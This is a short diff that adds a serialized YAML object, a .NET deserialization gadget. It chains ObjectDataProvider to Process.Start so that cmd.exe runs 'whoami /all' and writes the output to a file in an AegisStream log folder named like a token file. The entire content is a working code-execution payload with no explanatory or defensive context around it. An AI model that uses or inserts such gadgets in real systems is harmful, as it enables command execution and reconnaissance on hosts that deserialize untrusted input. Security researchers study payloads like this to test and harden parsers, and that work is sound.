@@ -1,0 +1,11 @@
+!<!System.Windows.Data.ObjectDataProvider,PresentationFramework> {
+  MethodName: Start,
+  ObjectInstance:
+    !<!System.Diagnostics.Process,System.Diagnostics.Process> {
+      StartInfo:
+        !<!System.Diagnostics.ProcessStartInfo,System.Diagnostics.Process> {
+          FileName: cmd.exe,
+          Arguments: '/c whoami /all > C:\ProgramData\AegisStream\logs\stream-token.txt 2>&1'
+        }
+    }
+}
